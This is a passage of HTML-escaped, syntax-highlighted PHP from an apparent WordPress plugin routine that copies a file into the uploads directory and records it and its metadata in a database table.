class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expiry&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;never&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expiry&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Y-m-d&amp;ensp;H:i:s&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;time&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;intval&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expiry&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$refId&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;generate_refId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$url&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$parsed_url&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;parse_url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;PHP_URL_PATH&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;basename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$parsed_url&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$extension&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;pathinfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;PATHINFO_EXTENSION&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$extension&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;pathinfo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;PATHINFO_EXTENSION&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$newFilename&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$refId&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$extension&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$unique_filename&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_unique_filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_upload_dir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$newFilename&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$destination&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_upload_dir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$unique_filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$target&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;uploads&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;check_db&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Could&amp;ensp;not&amp;ensp;create&amp;ensp;database&amp;ensp;table.&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;copy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$destination&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Could&amp;ensp;not&amp;ensp;move&amp;ensp;the&amp;ensp;file.&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$url&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_upload_dir&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$unique_filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$now&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Y-m-d&amp;ensp;H:i:s&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$fileId&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;commit_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;refId&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$refId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;envId&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$envId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;purpose&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$purpose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;status&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;uploaded&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;created&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;updated&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;expires&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$expires&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$destination&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$url&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metadata&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;is_array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metadata&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metadata&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metaKey&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metaValue&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add_metadata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$fileId&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metaKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$metaValue&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$target&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;library&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;filter_var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$path&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;FILTER_VALIDATE_URL&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$tmp&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span 